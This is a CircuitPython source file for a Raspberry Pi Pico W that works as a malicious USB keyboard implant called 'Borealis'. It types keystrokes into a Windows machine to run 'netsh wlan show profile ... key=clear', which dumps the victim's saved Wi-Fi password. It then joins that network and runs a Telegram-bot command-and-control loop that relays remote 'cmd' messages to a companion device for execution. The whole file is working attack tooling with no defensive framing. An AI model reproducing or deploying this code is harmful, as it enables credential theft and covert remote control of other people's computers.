#IMPORTS
import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import adafruit_requests
import ssl
import os
import ipaddress
import wifi
import microcontroller
import socketpool

#SETUP
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
led.value = False
hidmode = digitalio.DigitalInOut(board.GP9)
hidmode.direction = digitalio.Direction.INPUT
hidmode.pull = digitalio.Pull.UP
terminate = digitalio.DigitalInOut(board.GP19)
terminate.direction = digitalio.Direction.INPUT
terminate.pull = digitalio.Pull.UP
run,total = True,0
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
lst = ["D:","E:","F:","G:","H:","I:","J:"]
first_read,update_id = False,0
with open("settings.txt","r") as f:
    __ = f.readlines()
    name = __[0].replace("\n","").strip()
    borealisname = __[1].replace("\n","").strip()
    token = __[2].replace("\n","").strip()

#FUNCTIONS
def a():
    return not hidmode.value
def b():
    return not terminate.value
def saveflag(value: str):
    # Encode the string into bytes
    encoded_value = value.encode('utf-8')
    # Ensure it fits in the available NVM size (usually 512 bytes)
    if len(encoded_value) > 512:
        raise ValueError("String too long to store in NVM")
    # Save the encoded bytes to NVM
    for i in range(len(encoded_value)):
        microcontroller.nvm[i] = encoded_value[i]
    # Mark the end of the string
    microcontroller.nvm[len(encoded_value)] = 0

def loadflag() -> str:
    # Read bytes from NVM until the end marker is found
    byte_list = []
    for i in range(512):
        if microcontroller.nvm[i] == 0:
            break
        byte_list.append(microcontroller.nvm[i])
    # Decode bytes back to a string
    return bytes(byte_list).decode('utf-8')
def execute(cmd):
    print(f"Composer Activated\nName: 'Borealis'\nPassword: 'pico-pico'")
    wifi.radio.connect("Borealis", "pico-pico")
    try:
        pool = socketpool.SocketPool(wifi.radio)
        requests = adafruit_requests.Session(pool, ssl.create_default_context())
        request_header={
            'X-HTTP-Method-Override': 'GET'
        }
        response = requests.post("http://192.168.4.1/", json={"command":"".join(cmd[1:])}, headers=request_header)
    except adafruit_requests.OutOfRetries:
        print("Command Sent")
        saveflag("result Command Sent")
        microcontroller.reset()
    except Exception:
        print("Command Failed to Send")
        saveflag("result Command Failed to Send")
        microcontroller.reset()
def hid():
    print("Fetching Password...")
    time.sleep(1.25)
    kbd.send(Keycode.WINDOWS,Keycode.R)
    time.sleep(0.5)
    layout.write('cmd\n')
    time.sleep(1.75)
    for i in lst: layout.write(f'{i}\n')
    layout.write(f"netsh wlan show profile name={name} key=clear > password.txt && exit\n")
def passwrd():
    with open("password.txt","r",encoding="utf-8") as f:
        return f.readlines()[32].strip().split("Key Content            : ")[1]
def composer(password):
    global first_read
    global name
    global update_id
    secrets = {
    "ssid"                     : str(name),
    "password"                 : str(password),
    "bottoken"       : str(token),
    }
    API_URL = "https://api.telegram.org/bot" + secrets["bottoken"]
    print("Connecting to WiFi")
    string = loadflag()
    if "result" in string:
        print(f"Composer Activated\nName: '"+secrets["ssid"]+"' Password: '"+secrets["password"]+"'")
        wifi.radio.connect(secrets['ssid'], secrets['password'])
        print("Connected to WiFi")
        pool = socketpool.SocketPool(wifi.radio)
        print("My IP address is", wifi.radio.ipv4_address)
        ipv4 = ipaddress.ip_address("8.8.4.4")
        requests = adafruit_requests.Session(pool, ssl.create_default_context())
    else:
        execute(string.replace("cmd ",""))
    def init_bot():
        get_url = API_URL
        get_url += "/getMe"
        r = requests.get(get_url)
        return r.json()['ok']
    def read_message():
        global first_read
        global update_id

        get_url = API_URL
        get_url += "/getUpdates?limit=1&allowed_updates=[\"message\",\"callback_query\"]"
        if first_read == False:
            get_url += "&offset={}".format(update_id)

        r = requests.get(get_url)

        try:
            update_id = r.json()['result'][0]['update_id']
            message = r.json()['result'][0]['message']['text']
            chat_id = r.json()['result'][0]['message']['chat']['id']

            print("Chat ID: {}\tMessage: {}".format(chat_id, message))

            first_read = False
            update_id += 1

            return chat_id, message.lower()

        except (IndexError) as e:
            return False, False

    def send_message(chat_id, message):
        get_url = API_URL
        get_url += "/sendMessage?chat_id={}&text={}".format(chat_id, message)
        r = requests.get(get_url)

    if init_bot() == False:
        print("Composer Failed")
    else:
        print("Composer Online\n")

        while True:
            try:
                while not wifi.radio.ipv4_address or "0.0.0.0" in repr(wifi.radio.ipv4_address):
                    print(f"Reconnecting to WiFi...")
                    wifi.radio.connect(ssid=secrets["ssid"], password=secrets["password"])
                chat_id, message_in = read_message()
                if message_in == "/start":
                    send_message(chat_id, "Borealis Online")
                elif message_in == "led on":
                    led.value = True
                    send_message(chat_id, "LED turned on.")
                elif message_in == "led off":
                    led.value = False
                    send_message(chat_id, "LED turned off.")
                elif "cmd" in str(message_in):
                    if "result" in loadflag():
                        send_message(chat_id,loadflag().replace("result ",""))
                        saveflag("")
                    else:
                        cmd = message_in.split("cmd ")[-1]
                        send_message(chat_id, f"Running Command {cmd}")
                        saveflag(message_in)
                        microcontroller.reset()
                    
                else:
                    send_message(chat_id, "Command is not available.")

            except OSError as e:
                print("Error:",e)
                microcontroller.reset()

#MAINLOOP
while True:
    if a():
        hid()
        led.value = True
        composer(passwrd())
    elif b():
        run = not run
        led.value = False
    if total>=5 and run == True:
        led.value = True
        composer(passwrd().strip())
    time.sleep(0.1)
    total = total + 0.1
